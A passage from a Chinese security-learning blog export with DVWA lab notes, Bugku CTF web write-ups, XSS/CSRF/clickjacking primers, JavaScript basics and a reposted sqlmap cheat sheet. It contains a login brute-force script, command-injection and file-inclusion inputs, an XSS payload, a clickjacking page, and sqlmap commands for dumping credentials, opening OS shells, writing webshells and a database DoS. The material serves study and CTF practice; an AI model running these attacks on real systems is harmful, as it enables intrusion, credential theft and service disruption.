&apos;cookie&apos;:&apos;PHPSESSID=8fbhto539r4fnjt4dduolvikj3; security=high&apos;, &apos;Connection&apos;:&apos;keep-alive&apos;, &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;, &apos;Host&apos;:&apos;127.0.0.1&apos; } requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/&quot; def get_token(requrl,header): response=requests.get(url=requrl,headers=header) print (response.status_code,len(response.content)) soup=BeautifulSoup(response.text,&quot;html.parser&quot;) input=soup.form.select(&quot;input[type=&apos;hidden&apos;]&quot;) #返回的是一个list列表 user_token=input[0][&apos;value&apos;] #获取用户的token return user_token user_token=get_token(requrl,header) i=0 for line in open(&quot;password.txt&quot;): requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i=i+1 print (i , &apos;admin&apos; ,line.strip(),end=&quot; &quot;) user_token=get_token(requrl,header) # 尝试次数 if(i==20): break ) 我们继续查看impose等级，发现输错3次就被限制15分钟无法登入。那么还有什么是可以防止暴力破解的呢？还有验证码。]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[command injection]]></title>
    <url>%2F2019%2F03%2F09%2Fcommand-injection%2F</url>
    <content type="text"><![CDATA[一、什么是命令注入1、概念通过web应用程序在服务器上拼接系统命令。简单说就是注入的命令是系统命令，而注入是靠连接来完成的。常见的windows命令：ipconfig，查看本地网络net user,查看系统用户 dir “./ ” 查看当前目录 等等常见的命令拼接符有&amp;&amp;, &amp; ,|, || 二、尝试low等级输入127.0.0.1发现输出的内容就是在cmd执行ping命令的结果，也就是说它调用了系统命令，于是我们尝试下输入127.0.0.1 &amp; net user注入成功 三、尝试medium等级 四、尝试下high等级发现注入，那么我们采用 | 连接，发现注入成功我们查看源码，发现了原因 五、尝试下impose等级发现它现在了我们的IP格式，这就是所谓的白名单，可以有效的防止命令注入。不推荐黑名单，应该可以通过双引号，略过黑名单。linux下还支持单引号 如果不输出显示结果怎么办]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 12-16 write up(web)]]></title>
    <url>%2F2019%2F03%2F09%2Fbugku-12-16%2F</url>
    <content type="text"><![CDATA[一、第12题（头等舱）先尝试火狐浏览器的开发者工具，发现响应头为136字节，可是参数确说有139字节，隐藏了3个字节那么我们使用burp suit 抓包，然后使用repeater功能，go一下发现flag（flag即为隐藏的字节） 二、第13题（网站被黑）首先，根据域名和网页提示，我们需要找到网站后台。我们使用御剑工具直接扫除后台成功扫出网站后台进入网站后台，尝试了一些admin,password常用的密码之后，发现登入不了。我们使用burp suite,爆破功能进行爆破扫出密码为hack,输入密码即可得到flag 三、第14题（管理员系统）使用火狐浏览器开发者工具查看源码发现有段加密的base64代码解密后为test123，题目又提示，IP禁止访问，请联系本地管理员登陆，IP已被记录.。那么我们就给header添加个X-Forwarded-For: 127.0.0.1参数。 四、第15题（web4）观察源码发现，有一堆utf-8加密的字符，那么我们进行utf-8解密这个是解密后的结果观察eval函数语句可知，我们应该输入，p1+54aa2+p2的值,输入果然得出flag 五、第十六题（flag在index里）点击进去。发现这是个文件包含漏洞那么我们采用PHP伪协议，输入http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php会发现出现了base64代码。进行解码得到index.php的源码，发现flag被注释掉这就是我们为什么要使用base64编码输出的原因。 &lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file]){echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;} $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag:flag{edulcni_elif_lacol_si_siht} ?&gt; &lt;/html&gt; php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。 通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。 而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码 本题参考这篇博客解答：https://blog.csdn.net/zpy1998zpy/article/details/80585443]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 1~11题 write up（web）]]></title>
    <url>%2F2019%2F03%2F06%2Fbugku-1-11%2F</url>
    <content type="text"><![CDATA[一、第一题（web2）查看源代码，查找flag,即可得出flag。 二、第二题（计算器）输入163，发现只能输入一位数。位数被限制了。我们使用火狐浏览器的开发者工具（F12）调出来。定位到输入框的位置。发现最大位数被限制了，把1改成3即可得出flag。 三、第三题(web基础$_GET)打开题目发现是PHP代码，阅读代码可知，我们在URL中传入参数?what=flag即可得出flag 四、第四题(web基础$_POST)打开题目发现是PHP代码，阅读代码可知，需要使用POST方式传值。使用火狐浏览器的hackbar插件，如图 五、第五题（矛盾）先介绍下is_numeric()函数：is_numeric() 函数用于检测变量是否为数字或数字字符串。PHP 版本要求：PHP 4, PHP 5, PHP 7如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。 分析代码，可知，num必须==1，但是又不能是数字或者是数字字符串。 ==又表示只要值相等就可以了。那么我们可以在输入num=1XXX，xxx表示非数字。 六、第六题（web3）1、进入题目发现一直在弹窗，点了几遍确定后感觉被耍了。2、阻止弹窗查看源码。发现flag在最后一行的alert标签里。且被注释掉3、发现flag是&amp;#x类型的，这是unicode编码。不知道也没事，百度下就可以知道4、百度搜索unicode在线解码，就可以得出flag。 七、第七题（域名解析）看到题目域名解析我们就要想到hosts文件。我们打开hosts文件hosts文件位置C:\Windows\System32\drivers\etc在文件末尾加入123.206.87.240 flag.baidu.com在浏览器中输入flag.baidu.com或者123.206.87.240 即可得出flag 八、第八题（必须让他停下来）打开题目发现一直在刷新，观察源码，发现flag应该在图片刷出来的时候出现。我们使用burp suit进行抓包放包，经过了j几次（GO）操作之后，我们发现了flag. 九、第九题本地包含观察代码发现flag.php被隐藏起来了。尝试下传入参数?hello=hello,发现hello在下面代码中体现这样我们就可以直接传入参数输出flag.php文件的内容，发现flag。传入的参数是?hello=file(“flag.php”) 十、第十题（变量1）观察源码发现代码最后一行有个可变变量。我们让args=GLOBALS 全局数组变量 因为$args=GLOBALS 又var_dump($$args) ，所以和前面那个$ ，组成$GLOBALS flag变量又在$GLOBALS中，var_dump eval 成功得到flag $GLOBALS介绍 $GLOBALS[&#39;var&#39;]是外部的全局变量本身,在函数内部可以使用$GLOBALS数组调用2.作用域：Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。 $GLOBALS超全局数组适用于任何地方 十一、第十一题（web5）首先介绍下JSPFUCkJSFuck（或为了避讳脏话写作 JSF*ck ）是一种深奥的 JavaScript编程风格。以这种风格写成的代码中仅使用 [、]、(、)、! 和 + 六种字符。此编程风格的名字派生自仅使用较少符号写代码的Brainfuck语言。与其他深奥的编程语言不同，以JSFuck风格写出的代码不需要另外的编译器或解释器来执行，无论浏览器或JavaScript引擎中的原生 JavaScript 解释器皆可直接运行。鉴于 JavaScript 是弱类型语言，编写者可以用数量有限的字符重写 JavaScript 中的所有功能，且可以用这种方式执行任何类型的表达式。简单地说，就是有人不想让自己的代码被别人认出来，用6种字符改造了自己的js代码 我们查看源码发现有一堆的 [、]、(、)、! 和 + ，把他们扔进浏览器控制台（火狐浏览器按F12打开控制台）进行调试，即可得出flag,记得要大写。]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS和CSRF之介绍]]></title>
    <url>%2F2019%2F03%2F06%2Fxss1%2F</url>
    <content type="text"><![CDATA[一、什么是XSS全称：Cross Site Script中文名称：跨站脚本危害：盗取用户信息、钓鱼、制造蠕虫等 概念： 二、xss的分类1、存储型访问网站时，触发XSS我们可以通过查看网页源代码的方式查看xss的触发点。 我们安装irebug（F12快捷件打开），利用该火狐插件来寻找注入点。 分析其攻击过程但是xss脚本是怎样被黑客写入数据库呢2、反射型访问携带xss脚本的连接时触发xss 查看源码，寻找触发点 如何产生的呢（右边为xss源码）分析攻击过程 存储型xss和反射型xss的区别存储型xss是从数据库中提取xss的脚本内容反射型xss是直接从url的内容中提取出xss的脚本的内容 3、DOM型那什么是DOM呢，就是Document Object Model,即文档对象模型，它允许脚本（js）控制web的页面、窗口和文档。简单说DOM就是就是js操作html时的API(应用程序接口) 访问携带xss脚本的连接时触发xss 查看源码，了解触发点 分析原理 DOM型xss与反射型xss很类似，但是他们有什么区别呢DOM型xss是通过前端javascript将xss脚本写入DOM中，触发xss 反射型xss是通过后端或应用程序将xss脚本写入响应页面中，浏览器响应页面时才触发xss 存储型xss漏洞演示 xss代码应该为&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;，用管理员员登入后台，进入留言板会触发xss,出现弹窗内容为/xxxx/ 反射型xss漏洞演示我们写一个这样的脚本文件，命名为index.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_REQUEST[&quot;name&quot;])) { $name=$_REQUEST[&quot;name&quot;]; } else{ $name = &quot;&quot;; } echo &quot;hhhhh &quot;.$name; ?&gt; 本地访问下传入参数？name=&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;alert（）方法用于显示一条指定的消息和一个ok按钮的警告框用qq浏览器尝试下，xss注入被浏览器拦截了，尴尬了 用火狐浏览器再次尝试，成功注入xss查看源码即可发现注入位置DOM型xss漏洞这边就不演示了 4、小结 三、CSRF是什么全称：Cross-site request forgery 中文名称是：跨站请求伪造 危害：执行恶意操作（”被转账“、“被发垃圾评论”等）、制造蠕虫······· 概念：利用客户已经登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作 分析原理那里面恶意的网站是怎么做的呢？ 正常情况下：通常Cookie中会存放用户凭证信息浏览器在发送任何请求时都会带上已有的cookie通过cookie识别用户身份后，执行转账操作。 黑客的操作：伪造攻击代码，打开页面时自动完成转账]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Clickjacking(点击劫持)]]></title>
    <url>%2F2019%2F03%2F06%2FClickjacking%2F</url>
    <content type="text"><![CDATA[一、前置知识首先介绍下html下的iframe标签的作用：可以创建包含另一个文档的内联框架。例如下面这个代码。运行下面这个网页，发现他和网易安全中心的页面几乎一样，除了url不一样 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt; &lt;head&gt; &lt;title&gt;网易安全中心&lt;/title&gt; &lt;style &gt; html,body,iframe{ display: block; height: 100%; width: 100%; margin: 0; padding: 0; border: none; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; 案例，图片的背后是隐藏的网站。 二、什么是点击劫持呢通过覆盖不可见的框架误导受害者点击而造成的攻击行为。 三、点击劫持的特点1、隐蔽性高 2、骗取用户操作 3、UI-覆盖攻击 4、利用了iframe标签或者其他标签的属性 四、实例分析代码如下，效果如下 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt; &lt;head&gt; &lt;title&gt;点击劫持&lt;/title&gt; &lt;style &gt; /*设置高度、宽度*/ html,body,iframe{ display: block; height: 100%; width: 100%; margin: 0; padding: 0; border: none; } /*设置隐藏网页的可见度*/ iframe{ /*opacity: 0;*/ filter: alpha(opacity=0);/*IE*/ -moz-opacity:0.5;/*Moz+FF*/ opacity: 0.5;/*支持css3浏览器（FF1.5也支持）*/ position: absolute; z-index: 2;/*网页的堆叠层次*/ } /*设置按钮的位置*/ button{ position: absolute; top: -70px; left: 800px; z-index: 1; width: 72px; height: 26px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;button&gt;&lt;img src=&quot;3.jpg&quot;&gt;&lt;/button&gt; &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; 再做次修改效果，以及完全看不出背后的网易网页了。]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[URL跳转、命令注入、文件操作类漏洞介绍]]></title>
    <url>%2F2019%2F03%2F06%2FURL%2F</url>
    <content type="text"><![CDATA[一、什么是URL跳转漏洞呢借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。 二、实现方式1、Header头跳转实现代码2、javascript跳转实现代码3、meta跳转 三、原理分析 四、什么是命令注入系统命令注入 五、web应用如何注入命令PHP执行命令的注入例如分析攻击过程 六、常见的文件操作 七、常见的文件操作漏洞1、文件上传漏洞2、任意文件下载漏洞3、文件包含漏洞文件包含漏洞包括本地文件包含和远程文件包含]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[browser]]></title>
    <url>%2F2019%2F03%2F06%2Fbrowser%2F</url>
    <content type="text"><![CDATA[·浏览器安全性特性 一、介绍chrome浏览器1、如何修改安全设置？常规设置步骤快捷设置步骤2、如何清除缓存3、每一次都去清除缓存太麻烦了，可以使用隐身模式（无痕模式） 在功能菜单中选择新建无痕窗口即可3、如何查看网页源代码呢？4、如何查看DOM元素？F12直接打开下面的开发者工具栏5、如何查看网络数据包 二、介绍火狐浏览器火狐浏览器有个强大的插件库1、如何修改安全设置 三、介绍IE浏览器如何修改安全设置]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript基础]]></title>
    <url>%2F2019%2F03%2F03%2Fjs%2F</url>
    <content type="text"><![CDATA[一、概述JavaScript 是互联网上最受欢迎的编程语言之一，用于为网页添加交互性，处理数据，以及创建各种应用程序（移动应用程序，桌面应用程序，游戏等）,这门语言可用于 HTML 和 web，更可广泛用于服务器、PC、笔记本电脑、平板电脑和智能手机等设备。 二、用法在html中必须写在&lt;script&gt;&lt;/script&gt;中写入js代码。在网页中通常通过head和body增加javascript。 二、基础语法1、javaScript的输出 使用doument.write()方法将内容写到html页面中如： &lt;script&gt;document.write(&quot;hhhh&quot;) &lt;/script&gt; 2、window.alter()弹出警告框 &lt;script&gt;window.alter(&quot;hhhh&quot;) &lt;/script&gt; 3、用innerHTML写入到html元素中 demoP.innerHTML=&quot;a=&quot;+a+&quot;,b=&quot;+b; 4、使用console.log（）写入到浏览器的控制台。 5、document.getElementById(“demo”) 是使用 id 属性来查找 HTML 元素的 JavaScript 代码 。 6、 innerHTML = “Paragraph changed.” 是用于修改元素的 HTML 内容(innerHTML)的 JavaScript 代码。 7、格式化文本使用html标签来格式化javascript中的文本如： &lt;script&gt; document.write(&quot;&lt;h1&gt;hello world&lt;/h1&gt;&quot;); &lt;/script&gt; 8、&lt; script &gt;标签language和type两个属性，指定脚本类型 &lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt; &lt;/script&gt; 9、外部javascript在多个不同网页中使用相同的代码时，外部脚本是很实用的，javascript文件的文件后缀是.js。要使用外部脚本，将脚本文件的名称放在&lt; script &gt;标签的src属性中。 &lt; script src=&quot;index.js&quot;&gt;&lt; /script &gt; 注意：外部脚本不能使用&lt; script&gt;标签包裹，可以在&lt; head&gt;或&lt; body&gt;中放置外部脚本引用，将javascript放在外部文件中具有以下优点：（1）分离html和代码。（2）使html和javascript更容易阅读和维护。（3）缓存的javascript文件可以加快页面加载速度。 10、js变量声明用var来声明变量，注意js是区分大小写的 var x=5 变量命名的规则：a.变量必须以字母开头。b.变量也能以$和_符号开头（不推荐）。c.大小写不一样。d.变量名称不能包含空格。 11、基本数据类型只有一种数字类型，可以带小数，也可以不带。可以使用科学记数法来书写 var y = 123e5 ;//&lt;!--12300000--&gt; var y = 123e-5 ;//&lt;!--0.00123--&gt; 字符串，用单引号、双引号都可以 var pangzi = &quot;yang xiao pang&quot; ; var pangzi = &apos;yang xiao pang&apos; ; 但如果想在引号中再使用引号，须使用“\”转意处理引号中的引号。（如果引号类型不同则不用） var p= &quot;y \&quot;xiao p\&quot;&quot; ; var p = &apos;y \&apos;xiao p\&apos;&apos; ; 12、布尔：当值为0，null，undefined，空字符串时，布尔值为false。任何拥有值的字符串其布尔值为true。 13、数组 &lt;script&gt; var fatty = new Array(); fatty[0] = &quot;杨小胖&quot;; fatty[1] = &quot;景小胖&quot;; document.write(fatty); &lt;/script&gt; 或 &lt;script&gt; var fatty = new Array(&quot;杨小胖&quot;,&quot;景小胖&quot;); document.write(fatty); &lt;/script&gt; 14、复杂数据类型**对象 var fatty = {firstname = &quot;yang&quot;,lastname=&quot;yi&quot; ,id:1209｝; 对象的两种寻址方式： name = person.lastname; name = person[&quot;lasrname&quot;]; 声明变量类型：用new声明 var fatty = new String; 注意javascript变量均为对象，当声明一个变量时，就创建了一个新的对象。]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap常见的11种方法]]></title>
    <url>%2F2019%2F03%2F03%2Fsqlmap2%2F</url>
    <content type="text"><![CDATA[本文转载https://www.cnblogs.com/ichunqiu/p/5805108.html这篇文章一共有11种常见SQLmap使用方法： 一、SQLMAP用于Access数据库注入 (1) 猜解是否能注入12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; Linux : .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; (2) 猜解表 12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --tables (3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表) 12 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --columns -T admin (4) 根据字段猜解内容(假如通过3得到字段为username和password) 123 win: python sqlmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,password&quot; Linux: .lmap.py -u &quot;http://www.xxx.com/en/CompHonorBig.asp?id=7&quot; --dump -T admin -C &quot;username,[url=]B[/url]password&quot; 二、SQLMAP用于Cookie注入 (1) cookie注入，猜解表 1 win : python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --table --level 2 (2) 猜解字段，(通过1的表猜解字段，假如表为admin) 12 win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --columns -T admin --level 2 (3) 猜解内容 12 win :python sqlmap.py -u &quot;http://www.xxx.org/jsj/shownews.asp&quot; --cookie &quot;id=31&quot; --dump -T admin -C &quot;username,password&quot; --level 2 三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell 1234 win: python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell Linux: sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell (2) 输入执行语句完成DDOS攻击 1 select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f) 四、SQLMAP用于mysql注入 (1) 查找数据库 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; --dbs (2) 通过第一步的数据库查找表(假如数据库名为dataname) 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname --tables (3) 通过2中的表得出列名(假如表为table_name) 1 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name --columns (4) 获取字段的值(假如扫描出id,user,password字段) 12 python sqlmap.py -u &quot;http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C &quot;id,user,password&quot; --dump 五、SQLMAP中post登陆框注入 (1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.xxx.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令： 1./sqlmap.py -r search-test.txt -p tfUPass 这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 注入点：http://testasp.vulnweb.com/Login.asp 几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass (2) 自动的搜索 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] –forms (3) 指定参数搜索 1sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] –data “tfUName=321&amp;tfUPass=321” 六、SQLMAP中Google搜索注入 inurl后面的语言是由自己定的 注入过程中如果选y是注入，如果不是选n 1sqlmap -g inurl:php?id= 七、SQLMAP中的请求延迟参数 –delay –safe-freq 12python sqlmap.py –dbs -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; –delay 1python sqlmap.py –dbs -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; –safe-freq 3 参数 八、SQLMAP绕过WAF防火墙注入点:http://192.168.159.1/news.php?id=1 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 –dbs –batch –tamper “space2morehash.py” space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py 都是编码方式 space2hash.py base64encode.py charencode.py 九、SQLMAP查看权限 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] –privileges 十、SQLMAP伪静态注入(1) 查找数据库 1python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; –dbs (2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname) 1python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname –tables (3) 通过2中的数据表得到字段(假如得到的是tablename表) 12python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename –columns (4) 通过3得到字段值(假如从3中得到字段id，password) 12python sqlmap.py -u “http://xxx.cn/index.php/Index/view/id/40.html&quot; -D dataname -Ttablename -C “password” –dump 十一、SQLMAP注入点执行命令与交互写shell (1) 注入点：http://192.168.159.1/news.php?id=1 此处采用的是Linux系统 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] –os-cmd=ipconfig 出现语言的选择根据实际的测试网站选择语言 指定目标站点D:/www/ (2) 获取Shell 1sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] –os-shell 出现语言的选择根据实际的测试网站选择语言 指定目标站点D:/www/ 输入ipconfig/all 创建用户和删除用户 只要权限足够大，你可以输入使用任何命令。 其他命令参考下面： 从数据库中搜索字段 1sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password 在dedecms数据库中搜索字段admin或者password。 读取与写入文件 首先找需要网站的物理路径，其次需要有可写或可读权限。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径） –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell） –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 #示例： 1sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php” 使用shell命令： 1sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell 接下来指定网站可写目录： “E:\php\htdocs\dvwa” #注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数） sqlmap详细命令： -is-dba 当前用户权限（是否为root权限） -dbs 所有数据库 -current-db 网站当前数据库 -users 所有数据库用户 -current-user 当前数据库用户 -random-agent 构造随机user-agent -passwords 数据库密码 -proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理 -time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） Options（选项）：-version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1） Target（目标）： 以下至少需要设置其中一个选项，设置目标URL。 -d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。 Request（请求）： 这些选项可以用来指定如何连接到目标URL。 -data=DATA 通过POST发送的数据字符串-cookie=COOKIE HTTP Cookie头-cookie-urlencode URL 编码生成的cookie注入-drop-set-cookie 忽略响应的Set – Cookie头信息-user-agent=AGENT 指定 HTTP User – Agent头-random-agent 使用随机选定的HTTP User – Agent头-referer=REFERER 指定 HTTP Referer头-headers=HEADERS 换行分开，加入其他的HTTP头-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）-auth-cert=ACERT HTTP认证证书（key_file，cert_file）-proxy=PROXY 使用HTTP代理连接到目标URL-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）-ignore-proxy 忽略系统默认的HTTP代理-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）-retries=RETRIES 连接超时后重新连接的时间（默认3）-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式-safe-url=SAFURL 在测试过程中经常访问的url地址-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL Enumeration（枚举）：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。 -b, –banner 检索数据库管理系统的标识-current-user 检索数据库管理系统当前用户-current-db 检索数据库管理系统当前数据库-is-dba 检测DBMS当前用户是否DBA-users 枚举数据库管理系统用户-passwords 枚举数据库管理系统用户密码哈希-privileges 枚举数据库管理系统用户的权限-roles 枚举数据库管理系统用户的角色-dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）-tables 枚举的DBMS数据库中的表-columns 枚举DBMS数据库表列-dump 转储数据库管理系统的数据库中的表项-dump-all 转储所有的DBMS数据库表中的条目-search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户-exclude-sysdbs 枚举表时排除系统数据库-start=LIMITSTART 第一个查询输出进入检索-stop=LIMITSTOP 最后查询的输出进入检索-first=FIRSTCHAR 第一个查询输出字的字符检索-last=LASTCHAR 最后查询的输出字字符检索-sql-query=QUERY 要执行的SQL语句-sql-shell 提示交互式SQL的shell Optimization（优化）：这些选项可用于优化SqlMap的性能。 -o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1） Injection（注入）：这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据 Detection（检测）：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 –level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页 Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。 –technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符 Fingerprint（指纹）：-f, –fingerprint 执行检查广泛的DBMS版本指纹 Brute force（蛮力）：这些选项可以被用来运行蛮力检查。 –common-tables 检查存在共同表 –common-columns 检查存在共同列 User-defined function injection（用户自定义函数注入）： 这些选项可以用来创建用户自定义函数。 –udf-inject 注入用户自定义函数 –shared-lib=SHLIB 共享库的本地路径 File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）：这些选项可以用于访问后端数据库管理系统的底层操作系统。 –os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 